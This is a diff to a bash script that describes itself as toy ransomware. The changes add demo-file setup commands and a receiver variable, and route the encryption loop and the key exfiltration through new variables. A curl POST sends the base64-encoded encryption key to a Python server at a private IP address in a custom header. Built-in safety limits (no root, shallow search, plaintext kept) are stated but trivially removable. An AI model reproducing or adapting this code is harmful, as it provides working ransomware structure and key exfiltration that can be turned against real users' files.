@@ -1,20 +1,27 @@
 #!/usr/bin/env bash
 
-### Commands to create example directory populated with files
-### mkdir -p rx_dir
-### 
-###
-###
-###
+# Commands to create example directory populated with files
+#   mkdir -p rx_dir
+#   touch rx_dir/account{1..12}{01,15}{24,25}.csv
+#   touch rx_dir/hr{Apr,June,Oct}{23,25}.docx
+#   for f in rx_dir/*.docx; do echo $(openssl rand -hex 16) >> $f; done
+#   for f in rx_dir/*.docx; do echo $(openssl rand -hex 16) >> $f; done
 
 # Just for funsies ransomware written in bash
 # Using built-in Linux tools
 # It has three layers to protect you from yourself
 # Don't mess with them!
 
-### 1) Running as root is DISALLOWED - reduces scope of oopsies
-### 2) Search recursion is limited to 1 - reduces depth of oopsies
-### 3) The plaintext files are not deleted. They are moved to .deleted_files
+# 1) Running as root is DISALLOWED - reduces scope of oopsies
+# 2) Search recursion is limited to 1 - reduces depth of oopsies
+# 3) The plaintext files are not deleted. They are moved to .deleted_files
+
+# VARIABLES
+# IP and port of Python server
+RECEIVER="http://192.168.1.173:8080"
+
+# Directory containing files we are targeting
+TARGET_DIR=".deleted_files"
 
 # SANITY AND SAFETY CHECK!
 # Prevent execution as root
@@ -162,7 +169,7 @@ echo -e "\t =KEY: $key"
 
 # Transmit secret via a header in a POST request; encoding as Base64
 # Using the very RFC-conforming "Special-Delivery" header
-curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "http://192.168.1.173:8080" 2>/dev/null
+curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "$RECEIVER" 2>/dev/null
 
 # Ensure the script is run from a location where rx_dir is created, or provide a full path.
 # Example: find_files "$(pwd)/rx_dir" "exposed_files"
@@ -175,5 +182,5 @@ find_files "rx_dir" "exposed_files"
 echo "---------ENCRYPTING---------"
 echo ":"
 for file in "${exposed_files[@]}"; do
-  encrypt_file "$file" ".deleted_files" # Always double-quote variable expansions
+  encrypt_file "$file" "$TARGET_DIR" # Always double-quote variable expansions
 done
